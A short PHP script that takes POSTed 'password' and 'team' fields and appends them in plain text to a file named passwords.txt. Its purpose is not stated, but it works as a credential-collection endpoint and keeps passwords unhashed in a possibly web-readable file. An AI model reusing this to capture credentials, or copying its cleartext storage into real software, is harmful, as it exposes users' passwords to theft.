<?php
$file = fopen("passwords.txt", "a") or die("Unable to open file!");
if(isset($_POST['password']) and isset($_POST['team'])){
	$team=$_POST["team"];
	$password=$_POST["password"];
	$output="password: $password team: $team";// password: $password;
	fwrite($file, $output);
}
else{
	fwrite($file, 'failure');
}
fclose($file);
echo "hello"
?>
